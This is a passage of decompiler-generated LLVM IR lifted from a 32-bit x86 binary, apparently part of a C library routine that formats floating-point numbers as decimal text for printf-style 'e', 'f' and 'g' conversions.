  %v6_804e69d = sub i8 95, %stack_var_-207.0
  %v7_804e69d = and i8 %v6_804e69d, %stack_var_-207.0
  %v8_804e69d = icmp slt i8 %v7_804e69d, 0
  %v9_804e69d = icmp eq i8 %v4_804e69d, 0
  %v10_804e69d = icmp slt i8 %v4_804e69d, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_804e6b2 = icmp eq i1 %v10_804e69d, %v8_804e69d
  %v4_804e6b2 = icmp eq i1 %v9_804e69d, false
  %v5_804e6b2 = and i1 %v4_804e6b2, %v3_804e6b2
  br i1 %v5_804e6b2, label %dec_label_pc_804e6b9, label %dec_label_pc_804e6b4

dec_label_pc_804e6b4:                             ; preds = %dec_label_pc_804e68f
  br label %dec_label_pc_804e6b9

dec_label_pc_804e6b9:                             ; preds = %dec_label_pc_804e68f, %dec_label_pc_804e6b4
  %v2_804e6c1 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804e6c1, i32* @ecx, align 4
  br label %dec_label_pc_804ea8a

dec_label_pc_804e6ca:                             ; preds = %dec_label_pc_804e642, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_804e6e4 = xor i3 %v4_804e5b4, -4
  store i3 %v3_804e6e4, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_804e6ea

dec_label_pc_804e6ea:                             ; preds = %dec_label_pc_804e73b, %dec_label_pc_804e6ca
  %v0_804e73b = phi i32 [ 4096, %dec_label_pc_804e6ca ], [ %v2_804e73b, %dec_label_pc_804e73b ]
  %v2_804e6ed = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804e6ca ], [ %v2_804e6ed81, %dec_label_pc_804e73b ]
  %v1_804e725 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_804e6ca ], [ %v0_804e6ea79, %dec_label_pc_804e73b ]
  %v0_804e73766 = phi i32 [ 13, %dec_label_pc_804e6ca ], [ %v1_804e6ec, %dec_label_pc_804e73b ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_804e6ca ], [ %stack_var_-220.1, %dec_label_pc_804e73b ]
  %v1_804e6ec = add i32 %v0_804e73766, -1
  %v4_804e6ed = fcmp ule x86_fp80 %v1_804e725, %v2_804e6ed
  br i1 %v4_804e6ed, label %dec_label_pc_804e714, label %dec_label_pc_804e6f1

dec_label_pc_804e6f1:                             ; preds = %dec_label_pc_804e6ea
  store x86_fp80 %v1_804e725, x86_fp80* %st0.global-to-local, align 4
  %v3_804e6f3 = mul i32 %v1_804e6ec, 12
  store i32 %v3_804e6f3, i32* %eax.global-to-local, align 4
  %v1_804e6f6 = add i32 %v3_804e6f3, ptrtoint (x86_fp80** @global_var_8052ce0.394 to i32)
  %v2_804e6f6 = inttoptr i32 %v1_804e6f6 to x86_fp80*
  %v3_804e6f6 = load x86_fp80, x86_fp80* %v2_804e6f6, align 4
  %v4_804e6fc = fmul x86_fp80 %v1_804e725, %v3_804e6f6
  store x86_fp80 %v4_804e6fc, x86_fp80* %st1.global-to-local, align 4
  %v4_804e700 = fcmp ule x86_fp80 %v4_804e6fc, %v3_804e6f6
  br i1 %v4_804e700, label %dec_label_pc_804e735, label %dec_label_pc_804e704

dec_label_pc_804e704:                             ; preds = %dec_label_pc_804e6f1
  store x86_fp80 %v4_804e6fc, x86_fp80* %st1.global-to-local, align 4
  %v5_804e70e = sub i32 %stack_var_-220.0, %v0_804e73b
  br label %dec_label_pc_804e737

dec_label_pc_804e714:                             ; preds = %dec_label_pc_804e6ea
  %v3_804e714 = mul i32 %v1_804e6ec, 12
  store i32 %v3_804e714, i32* %eax.global-to-local, align 4
  %v1_804e717 = add i32 %v3_804e714, ptrtoint (x86_fp80** @global_var_8052ce0.394 to i32)
  %v2_804e717 = inttoptr i32 %v1_804e717 to x86_fp80*
  %v3_804e717 = load x86_fp80, x86_fp80* %v2_804e717, align 4
  %v4_804e71d = fdiv x86_fp80 %v3_804e717, %v1_804e725
  store x86_fp80 %v4_804e71d, x86_fp80* %st1.global-to-local, align 4
  %v4_804e71f = fcmp ogt x86_fp80 %v3_804e717, %v1_804e725
  br i1 %v4_804e71f, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_804e714
  store x86_fp80 %v3_804e717, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804e725

bb183:                                            ; preds = %dec_label_pc_804e714
  %v5_804e71f = fcmp olt x86_fp80 %v3_804e717, %v1_804e725
  br i1 %v5_804e71f, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_804e717, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804e735

bb184:                                            ; preds = %bb183
  %not.v6_804e71f = fcmp une x86_fp80 %v3_804e717, %v1_804e725
  store x86_fp80 %v3_804e717, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_804e71f, label %dec_label_pc_804e735, label %dec_label_pc_804e725

dec_label_pc_804e725:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_804e717, x86_fp80* %st1.global-to-local, align 4
  %v5_804e72f = add i32 %stack_var_-220.0, %v0_804e73b
  br label %dec_label_pc_804e737

dec_label_pc_804e735:                             ; preds = %dec_label_pc_804e6f1, %.thread51, %bb184
  %v1_804e735 = phi x86_fp80 [ %v1_804e725, %.thread51 ], [ %v1_804e725, %bb184 ], [ %v3_804e6f6, %dec_label_pc_804e6f1 ]
  %v0_804e6ea80 = phi x86_fp80 [ %v3_804e717, %.thread51 ], [ %v3_804e717, %bb184 ], [ %v4_804e6fc, %dec_label_pc_804e6f1 ]
  store x86_fp80 %v1_804e735, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804e737

dec_label_pc_804e737:                             ; preds = %dec_label_pc_804e725, %dec_label_pc_804e704, %dec_label_pc_804e735
  %v2_804e6ed81 = phi x86_fp80 [ %v1_804e735, %dec_label_pc_804e735 ], [ %v2_804e6ed, %dec_label_pc_804e725 ], [ %v1_804e725, %dec_label_pc_804e704 ]
  %v0_804e6ea79 = phi x86_fp80 [ %v0_804e6ea80, %dec_label_pc_804e735 ], [ %v3_804e717, %dec_label_pc_804e725 ], [ %v4_804e6fc, %dec_label_pc_804e704 ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_804e735 ], [ %v5_804e72f, %dec_label_pc_804e725 ], [ %v5_804e70e, %dec_label_pc_804e704 ]
  %v1_804e737 = icmp eq i32 %v1_804e6ec, 0
  br i1 %v1_804e737, label %.thread60, label %dec_label_pc_804e73b

dec_label_pc_804e73b:                             ; preds = %dec_label_pc_804e737
  %v2_804e73b = sdiv i32 %v0_804e73b, 2
  store i32 %v2_804e73b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e6ea

.thread60:                                        ; preds = %dec_label_pc_804e737
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_804e75f

dec_label_pc_804e75f:                             ; preds = %dec_label_pc_804e642, %.thread60
  %v0_804e819 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_804e642 ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_804e642 ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_804e763 = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_804e63a, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_804e776 = and i32 %v2_804e763, -65536
  %v1_804e77b = udiv i16 %tmp146, 256
  %v2_804e77b = zext i16 %v1_804e77b to i32
  %v3_804e77b = or i32 %v2_804e77b, 12
  %v10_804e77b = mul nuw nsw i32 %v3_804e77b, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_804e776.masked = zext i16 %tmp194 to i32
  %v11_804e77b = or i32 %v10_804e77b, %v4_804e776.masked
  %v12_804e77b = or i32 %v11_804e77b, %v6_804e776
  store i32 %v12_804e77b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e783

dec_label_pc_804e783:                             ; preds = %dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge, %dec_label_pc_804e75f
  %v2_804e7a8 = phi x86_fp80 [ %storemerge, %dec_label_pc_804e75f ], [ %v2_804e7a8.pre, %dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge ]
  %v1_804e783 = phi i3 [ %v1_804e63a, %dec_label_pc_804e75f ], [ %v1_804e783.pre, %dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge ]
  %v3_804e7aa = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_804e75f ], [ %v0_804e783.pre, %dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_804e763, %dec_label_pc_804e75f ], [ %v4_804e7a3, %dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_804e7aa to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_804e79d = sitofp i32 %tmp195 to x86_fp80
  %v4_804e7a3 = add i32 %stack_var_-212.0, 9
  %v4_804e7a8 = fsub x86_fp80 %v2_804e7a8, %v5_804e79d
  store i3 %v1_804e783, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804e7aa = fmul x86_fp80 %v3_804e7aa, %v4_804e7a8
  store x86_fp80 %v4_804e7aa, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804e7ac

dec_label_pc_804e7ac:                             ; preds = %dec_label_pc_804e7ac.dec_label_pc_804e7ac_crit_edge, %dec_label_pc_804e783
  %v0_804e7c0 = phi i32 [ %v0_804e7c0.pre, %dec_label_pc_804e7ac.dec_label_pc_804e7ac_crit_edge ], [ %tmp195, %dec_label_pc_804e783 ]
  %v0_804e7b0 = phi i32 [ %v0_804e7b0.pre, %dec_label_pc_804e7ac.dec_label_pc_804e7ac_crit_edge ], [ 0, %dec_label_pc_804e783 ]
  %v1_804e7b0 = add i32 %v0_804e7b0, 1
  store i32 %v1_804e7b0, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_804e7ba = sub i32 %v4_804e7a3, %v1_804e7b0
  %div = udiv i32 %v0_804e7c0, 10
  %tmp185 = urem i32 %v0_804e7c0, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_804e7c6 = and i32 %div, 536870656
  store i32 %v2_804e7ba, i32* %edx.global-to-local, align 4
  %v1_804e7cc = trunc i32 %tmp185 to i8
  %v2_804e7cc = or i8 %v1_804e7cc, 48
  %v12_804e7cc = zext i8 %v2_804e7cc to i32
  %v15_804e7cc = or i32 %v12_804e7cc, %v3_804e7c6
  store i32 %v15_804e7cc, i32* %eax.global-to-local, align 4
  %v3_804e7d1 = inttoptr i32 %v2_804e7ba to i8*
  store i8 %v2_804e7cc, i8* %v3_804e7d1, align 1
  %v7_804e7d3 = icmp sgt i32 %v1_804e7b0, 8
  br i1 %v7_804e7d3, label %dec_label_pc_804e7d5, label %dec_label_pc_804e7ac.dec_label_pc_804e7ac_crit_edge

dec_label_pc_804e7ac.dec_label_pc_804e7ac_crit_edge: ; preds = %dec_label_pc_804e7ac
  %v0_804e7b0.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_804e7c0.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e7ac

dec_label_pc_804e7d5:                             ; preds = %dec_label_pc_804e7ac
  %v0_804e7d5 = load i32, i32* @edi, align 4
  %v1_804e7d5 = add i32 %v0_804e7d5, 1
  store i32 %v1_804e7d5, i32* @edi, align 4
  %v7_804e7d9 = icmp sgt i32 %v1_804e7d5, 2
  br i1 %v7_804e7d9, label %dec_label_pc_804e7db, label %dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge

dec_label_pc_804e7d5.dec_label_pc_804e783_crit_edge: ; preds = %dec_label_pc_804e7d5
  %v0_804e783.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_804e783.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_804e7a8.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_804e783

dec_label_pc_804e7db:                             ; preds = %dec_label_pc_804e7d5
  %v0_804e7db = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_804e7db = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_804e7db, x86_fp80* %st0.global-to-local, align 4
  %v2_804e7dd = add i3 %v0_804e7db, 2
  store i3 %v2_804e7dd, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_804e7df = add i8 %stack_var_-207.0, -96
  %v6_804e7df = sub i8 95, %stack_var_-207.0
  %v7_804e7df = and i8 %v6_804e7df, %stack_var_-207.0
  %v8_804e7df = icmp slt i8 %v7_804e7df, 0
  %v9_804e7df = icmp eq i8 %v4_804e7df, 0
  %v10_804e7df = icmp slt i8 %v4_804e7df, 0
  %v3_804e7e4 = icmp eq i1 %v10_804e7df, %v8_804e7df
  %v4_804e7e4 = icmp eq i1 %v9_804e7df, false
  %v5_804e7e4 = and i1 %v4_804e7e4, %v3_804e7e4
  br i1 %v5_804e7e4, label %dec_label_pc_804e7f3, label %dec_label_pc_804e7e6

dec_label_pc_804e7e6:                             ; preds = %dec_label_pc_804e7db
  %v4_804e7e6 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_804e7f3

dec_label_pc_804e7f3:                             ; preds = %dec_label_pc_804e7db, %dec_label_pc_804e7e6
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_804e7db ], [ %v4_804e7e6, %dec_label_pc_804e7e6 ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_804e7db ], [ 69, %dec_label_pc_804e7e6 ]
  %v12_804e7f3 = icmp eq i8 %stack_var_-207.1, 103
  %v1_804e7f8 = icmp eq i1 %v12_804e7f3, false
  br i1 %v1_804e7f8, label %dec_label_pc_804e801, label %dec_label_pc_804e7fa

dec_label_pc_804e7fa:                             ; preds = %dec_label_pc_804e7f3
  %v0_804e7fa = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_804e7fa, 1
  br i1 %tmp186, label %dec_label_pc_804e808, label %dec_label_pc_804e7fe

dec_label_pc_804e7fe:                             ; preds = %dec_label_pc_804e7fa
  %v1_804e7fe = add i32 %v0_804e7fa, -1
  store i32 %v1_804e7fe, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e808

dec_label_pc_804e801:                             ; preds = %dec_label_pc_804e7f3
  %v12_804e801 = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v12_804e801, label %dec_label_pc_804e80c, label %dec_label_pc_804e801.dec_label_pc_804e808_crit_edge

dec_label_pc_804e801.dec_label_pc_804e808_crit_edge: ; preds = %dec_label_pc_804e801
  %v0_804e808.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e808

dec_label_pc_804e808:                             ; preds = %dec_label_pc_804e801.dec_label_pc_804e808_crit_edge, %dec_label_pc_804e7fa, %dec_label_pc_804e7fe
  %v0_804e808 = phi i32 [ %v0_804e808.pre, %dec_label_pc_804e801.dec_label_pc_804e808_crit_edge ], [ %v0_804e7fa, %dec_label_pc_804e7fa ], [ %v1_804e7fe, %dec_label_pc_804e7fe ]
  store i32 %v0_804e808, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e839

dec_label_pc_804e80c:                             ; preds = %dec_label_pc_804e801
  store i32 %v0_804e819, i32* %eax.global-to-local, align 4
  %v0_804e810 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e810 = add i32 %v0_804e810, %v0_804e819
  store i32 %v2_804e810, i32* %ebx.global-to-local, align 4
  %v5_804e817 = icmp slt i32 %v2_804e810, -1
  br i1 %v5_804e817, label %dec_label_pc_804e819, label %dec_label_pc_804e839

dec_label_pc_804e819:                             ; preds = %dec_label_pc_804e80c
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_804e821 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804e821, i32* %eax.global-to-local, align 4
  %v4_804e829 = bitcast i32* %stack_var_-72 to i8*
  %v5_804e829 = call i32 @__GI_memset(i8* %v4_804e829, i32 48, i32 21)
  store i32 %v5_804e829, i32* %eax.global-to-local, align 4
  %v0_804e839.pr.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e839

dec_label_pc_804e839:                             ; preds = %dec_label_pc_804e80c, %dec_label_pc_804e819, %dec_label_pc_804e808
  %v1_804e859 = phi i32 [ %v0_804e808, %dec_label_pc_804e808 ], [ %v2_804e810, %dec_label_pc_804e80c ], [ %v0_804e839.pr.pre, %dec_label_pc_804e819 ]
  %stack_var_-220.3 = phi i32 [ %v0_804e819, %dec_label_pc_804e808 ], [ %v0_804e819, %dec_label_pc_804e80c ], [ -1, %dec_label_pc_804e819 ]
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_804e84c = icmp sgt i32 %v1_804e859, 20
  br i1 %v7_804e84c, label %dec_label_pc_804e84e, label %dec_label_pc_804e859

dec_label_pc_804e84e:                             ; preds = %dec_label_pc_804e839
  %v2_804e84e = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_804e84e, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804e86d.preheader

dec_label_pc_804e859:                             ; preds = %dec_label_pc_804e839
  %v0_804e859 = load i32, i32* @esp, align 4
  %v2_804e859 = add i32 %v1_804e859, 165
  %v3_804e859 = add i32 %v2_804e859, %v0_804e859
  store i32 %v3_804e859, i32* %eax.global-to-local, align 4
  %v1_804e860 = add i32 %v3_804e859, 2
  %v2_804e860 = inttoptr i32 %v1_804e860 to i8*
  %v3_804e860 = load i8, i8* %v2_804e860, align 1
  %v4_804e860 = add i8 %v3_804e860, -53
  %v9_804e860 = sub i8 52, %v3_804e860
  %v10_804e860 = and i8 %v9_804e860, %v3_804e860
  %v11_804e860 = icmp slt i8 %v10_804e860, 0
  %v13_804e860 = icmp slt i8 %v4_804e860, 0
  store i32 %v1_804e860, i32* %ecx.global-to-local, align 4
  %v2_804e867 = icmp eq i1 %v13_804e860, %v11_804e860
  %v3_804e867 = zext i1 %v2_804e867 to i32
  br label %dec_label_pc_804e86d.preheader

dec_label_pc_804e86d.preheader:                   ; preds = %dec_label_pc_804e859, %dec_label_pc_804e84e
  %v0_804e86d102 = phi i32 [ %v1_804e860, %dec_label_pc_804e859 ], [ %v2_804e84e, %dec_label_pc_804e84e ]
  %storemerge71 = phi i32 [ %v3_804e867, %dec_label_pc_804e859 ], [ 0, %dec_label_pc_804e84e ]
  store i32 %storemerge71, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e86d

dec_label_pc_804e86d:                             ; preds = %dec_label_pc_804e86d.backedge, %dec_label_pc_804e86d.preheader
  %v3_804e86e = phi i32 [ %v3_804e86e.pre, %dec_label_pc_804e86d.backedge ], [ %storemerge71, %dec_label_pc_804e86d.preheader ]
  %v0_804e86d = phi i32 [ %v0_804e870, %dec_label_pc_804e86d.backedge ], [ %v0_804e86d102, %dec_label_pc_804e86d.preheader ]
  %v1_804e86d = add i32 %v0_804e86d, -1
  store i32 %v1_804e86d, i32* %ecx.global-to-local, align 4
  %v1_804e86e = inttoptr i32 %v1_804e86d to i8*
  %v2_804e86e = load i8, i8* %v1_804e86e, align 1
  %v4_804e86e = trunc i32 %v3_804e86e to i8
  %v5_804e86e = add i8 %v2_804e86e, %v4_804e86e
  store i8 %v5_804e86e, i8* %v1_804e86e, align 1
  %v0_804e870 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e870 = inttoptr i32 %v0_804e870 to i8*
  %v2_804e870 = load i8, i8* %v1_804e870, align 1
  %v3_804e870 = zext i8 %v2_804e870 to i32
  %v4_804e870 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e870 = and i32 %v4_804e870, -256
  %v6_804e870 = or i32 %v5_804e870, %v3_804e870
  store i32 %v6_804e870, i32* %edx.global-to-local, align 4
  %v7_804e872 = icmp eq i8 %v2_804e870, 48
  br i1 %v7_804e872, label %dec_label_pc_804e86d.backedge, label %dec_label_pc_804e877

dec_label_pc_804e86d.backedge:                    ; preds = %dec_label_pc_804e86d, %dec_label_pc_804e877
  %v3_804e86e.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e86d

dec_label_pc_804e877:                             ; preds = %dec_label_pc_804e86d
  %v2_804e877 = add i8 %v2_804e870, -57
  %v7_804e877 = sub i8 56, %v2_804e870
  %v8_804e877 = and i8 %v7_804e877, %v2_804e870
  %v9_804e877 = icmp slt i8 %v8_804e877, 0
  %v10_804e877 = icmp eq i8 %v2_804e877, 0
  %v11_804e877 = icmp slt i8 %v2_804e877, 0
  %v3_804e87a = icmp eq i1 %v11_804e877, %v9_804e877
  %v4_804e87a = icmp eq i1 %v10_804e877, false
  %v5_804e87a = and i1 %v4_804e87a, %v3_804e87a
  br i1 %v5_804e87a, label %dec_label_pc_804e86d.backedge, label %dec_label_pc_804e87c

dec_label_pc_804e87c:                             ; preds = %dec_label_pc_804e877
  %v2_804e87c = ptrtoint i32* %stack_var_-71 to i32
  store i32 %v2_804e87c, i32* %eax.global-to-local, align 4
  %tmp196 = icmp ugt i32 %v0_804e870, %v2_804e87c
  store i32 %stack_var_-220.3, i32* %esi.global-to-local, align 4
  br i1 %tmp196, label %dec_label_pc_804e887, label %dec_label_pc_804e894

dec_label_pc_804e887:                             ; preds = %dec_label_pc_804e87c
  store i32 %v2_804e763, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e89d

dec_label_pc_804e894:                             ; preds = %dec_label_pc_804e87c
  store i32 %v2_804e87c, i32* %edx.global-to-local, align 4
  store i32 %v2_804e87c, i32* %ecx.global-to-local, align 4
  %v1_804e89c = add i32 %stack_var_-220.3, 1
  store i32 %v1_804e89c, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e89d

dec_label_pc_804e89d:                             ; preds = %dec_label_pc_804e887, %dec_label_pc_804e894
  %v0_804e89d = phi i32 [ %v0_804e870, %dec_label_pc_804e887 ], [ %v2_804e87c, %dec_label_pc_804e894 ]
  %v1_804e89d = add i32 %v0_804e89d, 1
  store i32 %v1_804e89d, i32* %eax.global-to-local, align 4
  %v2_804e8a4 = inttoptr i32 %v1_804e89d to i8*
  store i8 0, i8* %v2_804e8a4, align 1
  br i1 %v1_804e7f8, label %dec_label_pc_804e8ca, label %dec_label_pc_804e8af

dec_label_pc_804e8af:                             ; preds = %dec_label_pc_804e89d
  %v0_804e8af = load i32, i32* %esi.global-to-local, align 4
  %v5_804e8b2 = icmp slt i32 %v0_804e8af, -4
  br i1 %v5_804e8b2, label %dec_label_pc_804e8d7, label %dec_label_pc_804e8b4

dec_label_pc_804e8b4:                             ; preds = %dec_label_pc_804e8af
  %v1_804e8b4 = load i32, i32* %ebx.global-to-local, align 4
  %v7_804e8b6 = icmp slt i32 %v1_804e8b4, %v0_804e8af
  br i1 %v7_804e8b6, label %dec_label_pc_804e8d7, label %dec_label_pc_804e8bf

dec_label_pc_804e8bf:                             ; preds = %dec_label_pc_804e8b4
  %v2_804e8c1 = sub i32 %v1_804e8b4, %v0_804e8af
  store i32 %v2_804e8c1, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e8db

dec_label_pc_804e8ca:                             ; preds = %dec_label_pc_804e89d
  %v4_804e8ca = zext i8 %stack_var_-207.1 to i32
  %v5_804e8ca = load i32, i32* %ebx.global-to-local, align 4
  %v6_804e8ca = and i32 %v5_804e8ca, -256
  %v7_804e8ca = or i32 %v6_804e8ca, %v4_804e8ca
  store i32 %v7_804e8ca, i32* %ebx.global-to-local, align 4
  %v10_804e8ce = icmp eq i8 %stack_var_-207.1, 102
  br i1 %v10_804e8ce, label %dec_label_pc_804e8ca.dec_label_pc_804e8db_crit_edge, label %dec_label_pc_804e8d7

dec_label_pc_804e8ca.dec_label_pc_804e8db_crit_edge: ; preds = %dec_label_pc_804e8ca
  %v0_804e8db.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804e8db

dec_label_pc_804e8d7:                             ; preds = %dec_label_pc_804e8af, %dec_label_pc_804e8b4, %dec_label_pc_804e8ca
  %stack_var_-197.0 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804e8ca ], [ 103, %dec_label_pc_804e8b4 ], [ 103, %dec_label_pc_804e8af ]
  store i32 0, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e8e5

dec_label_pc_804e8db:                             ; preds = %dec_label_pc_804e8ca.dec_label_pc_804e8db_crit_edge, %dec_label_pc_804e8bf
  %v0_804e8dd = phi i32 [ %v0_804e8db.pre, %dec_label_pc_804e8ca.dec_label_pc_804e8db_crit_edge ], [ %v0_804e8af, %dec_label_pc_804e8bf ]
  %stack_var_-197.1 = phi i8 [ %stack_var_-207.1, %dec_label_pc_804e8ca.dec_label_pc_804e8db_crit_edge ], [ 102, %dec_label_pc_804e8bf ]
  %v2_804e8db = icmp slt i32 %v0_804e8dd, 0
  store i32 %v0_804e8dd, i32* %ebx.global-to-local, align 4
  %v1_804e8df = icmp eq i1 %v2_804e8db, false
  br i1 %v1_804e8df, label %dec_label_pc_804e8e5, label %dec_label_pc_804e8e1

dec_label_pc_804e8e1:                             ; preds = %dec_label_pc_804e8db
  %v0_804e8e1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e8e1 = add i32 %v0_804e8e1, -1
  store i32 %v1_804e8e1, i32* %edx.global-to-local, align 4
  %v1_804e8e2 = inttoptr i32 %v1_804e8e1 to i8*
  store i8 48, i8* %v1_804e8e2, align 1
  %v0_804e91a.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e8e5

dec_label_pc_804e8e5:                             ; preds = %dec_label_pc_804e8db, %dec_label_pc_804e8d7, %dec_label_pc_804e8e1
  %v1_804e975 = phi i32 [ %v0_804e8dd, %dec_label_pc_804e8db ], [ %v0_804e91a.pre, %dec_label_pc_804e8e1 ], [ 0, %dec_label_pc_804e8d7 ]
  %stack_var_-197.2 = phi i8 [ %stack_var_-197.1, %dec_label_pc_804e8db ], [ %stack_var_-197.1, %dec_label_pc_804e8e1 ], [ %stack_var_-197.0, %dec_label_pc_804e8d7 ]
  %v2_804e8e5 = ptrtoint i32* %stack_var_-22 to i32
  store i32 %v2_804e8e5, i32* %eax.global-to-local, align 4
  %v0_804e8f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e8f4 = add i32 %v0_804e8f4, 1
  store i32 %v1_804e8f4, i32* %edi.global-to-local, align 4
  store i32 1, i32* %stack_var_-152, align 4
  %v1_804e903 = inttoptr i32 %v0_804e8f4 to i8*
  %v2_804e903 = load i8, i8* %v1_804e903, align 1
  %v3_804e903 = zext i8 %v2_804e903 to i32
  %v5_804e903 = and i32 %v2_804e8e5, -256
  %v6_804e903 = or i32 %v3_804e903, %v5_804e903
  store i32 %v6_804e903, i32* %eax.global-to-local, align 4
  store i32 %v6_804e903, i32* %stack_var_-22, align 4
  %v2_804e918 = sub i32 %v1_804e89d, %v1_804e8f4
  store i32 %v2_804e918, i32* %edx.global-to-local, align 4
  %v1_804e91a = icmp eq i32 %v1_804e975, 0
  %v2_804e91a = icmp slt i32 %v1_804e975, 0
  br i1 %v2_804e91a, label %dec_label_pc_804e969, label %dec_label_pc_804e91e

dec_label_pc_804e91e:                             ; preds = %dec_label_pc_804e8e5
  %v2_804e91e = sub i32 %v1_804e975, %v2_804e918
  %v8_804e91e = xor i32 %v2_804e918, %v1_804e975
  %v9_804e91e = xor i32 %v2_804e91e, %v1_804e975
  %v10_804e91e = and i32 %v9_804e91e, %v8_804e91e
  %v11_804e91e = icmp slt i32 %v10_804e91e, 0
  %v13_804e91e = icmp slt i32 %v2_804e91e, 0
  store i32 112, i32* %stack_var_-144, align 4
  %v2_804e92c = icmp eq i1 %v13_804e91e, %v11_804e91e
  br i1 %v2_804e92c, label %dec_label_pc_804e92e, label %dec_label_pc_804e962

dec_label_pc_804e92e:                             ; preds = %dec_label_pc_804e91e
  store i32 %v2_804e91e, i32* %eax.global-to-local, align 4
  %tmp187 = icmp slt i32 %v2_804e91e, 1
  %tmp188 = icmp eq i1 %tmp187, false
  br i1 %tmp188, label %dec_label_pc_804e943, label %dec_label_pc_804e95e

dec_label_pc_804e943:                             ; preds = %dec_label_pc_804e92e
  store i32 176, i32* %stack_var_-132, align 4
  br label %dec_label_pc_804e95e

dec_label_pc_804e95e:                             ; preds = %dec_label_pc_804e92e, %dec_label_pc_804e943
  %storemerge28.in = phi i32* [ %stack_var_-120, %dec_label_pc_804e943 ], [ %stack_var_-132, %dec_label_pc_804e92e ]
  store i32 -1, i32* %ebx.global-to-local, align 4
  %storemerge28 = ptrtoint i32* %storemerge28.in to i32
  store i32 %storemerge28, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e97e

